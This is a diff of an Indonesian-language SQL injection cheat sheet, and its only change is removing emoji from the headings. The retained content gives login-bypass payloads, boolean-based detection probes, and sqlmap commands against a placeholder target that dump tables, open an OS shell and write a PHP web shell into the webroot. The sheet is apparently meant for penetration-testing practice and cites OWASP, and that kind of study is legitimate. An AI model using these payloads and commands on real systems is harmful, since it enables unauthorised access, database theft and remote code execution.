@@ -1,16 +1,16 @@
-# 🗃️ SQL Injection — Mengekstrak Data & Mengambil Shell
+﻿# SQL Injection — Mengekstrak Data & Mengambil Shell
 
 > **Tujuan:** Mengeksploitasi celah SQL Injection untuk otentikasi bypass, eksfiltrasi data, dan bahkan RCE.
 
 ---
 
-## 📌 Penjelasan Singkat
+## Penjelasan Singkat
 
 SQL Injection terjadi ketika input pengguna **langsung disisipkan ke query SQL** tanpa parameterisasi. Dampaknya bervariasi: bypass login, dump database, atau mengeksekusi command OS.
 
 ---
 
-## 🔓 Auth Bypass (Login Form)
+## Auth Bypass (Login Form)
 
 ```
 '  OR  '1'='1'-- -       # Bypass login, kondisi selalu TRUE
@@ -22,7 +22,7 @@ admin'-- -               # Abaikan sisa query
 
 ---
 
-## 🕵️ Deteksi (Boolean Based)
+## Deteksi (Boolean Based)
 
 ```
 ?id=1 AND 1=1             # TRUE → response normal
@@ -33,7 +33,7 @@ admin'-- -               # Abaikan sisa query
 
 ---
 
-## 🛠️ SQLMap (Otomatis)
+## SQLMap (Otomatis)
 
 ### Tampilkan Database
 
@@ -55,7 +55,7 @@ sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch -D <DB> -T users --dump
 
 ---
 
-## 💀 OS Shell (RCE via SQLi)
+## OS Shell (RCE via SQLi)
 
 ```bash
 sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch --os-shell
@@ -82,7 +82,7 @@ Custom location
 
 ---
 
-## ✍️ Menulis File ke Webroot
+## Menulis File ke Webroot
 
 ```bash
 sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch --file-write shell.php --file-dest /var/www/<nama-apps>/shell.php
@@ -95,7 +95,7 @@ sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch --file-write shell.php --file
 
 ---
 
-## ✅ Checklist SQL Injection
+## Checklist SQL Injection
 
 - [ ] Deteksi dengan boolean test (`AND 1=1` / `AND 1=2`).
 - [ ] Coba auth bypass jika ada halaman login.
@@ -106,7 +106,7 @@ sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch --file-write shell.php --file
 
 ---
 
-## 📚 Referensi
+## Referensi
 
 - [OWASP – SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
 - [PayloadsAllTheThings – SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
